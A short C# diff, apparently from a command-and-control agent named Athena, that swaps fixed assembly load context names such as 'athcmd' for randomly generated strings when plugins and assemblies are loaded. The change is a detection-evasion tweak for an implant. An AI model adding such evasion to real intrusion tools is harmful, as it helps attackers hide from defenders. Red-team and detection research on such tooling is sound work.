@@ -19,8 +19,8 @@ namespace Athena.Commands
         private ConcurrentDictionary<string, IPlugin> loadedPlugins { get; set; }
         public AssemblyHandler()
         {
-            this.commandContext = new AssemblyLoadContext("athcmd");
-            this.executeAssemblyContext = new ExecuteAssemblyContext();
+            this.commandContext = new AssemblyLoadContext(Misc.RandomString(Misc.GenerateSmallerRandomNumber()));
+            this.executeAssemblyContext = new ExecuteAssemblyContext(Misc.RandomString(Misc.GenerateSmallerRandomNumber()));
             this.loadedPlugins = new ConcurrentDictionary<string, IPlugin>();
         }
         /// <summary>
@@ -187,7 +187,7 @@ namespace Athena.Commands
             try
             {
                 this.executeAssemblyContext.Unload();
-                this.executeAssemblyContext = new ExecuteAssemblyContext();
+                this.executeAssemblyContext = new ExecuteAssemblyContext(Misc.RandomString(Misc.GenerateSmallerRandomNumber()));
                 return new ResponseResult
                 {
                     task_id = job.task.id,
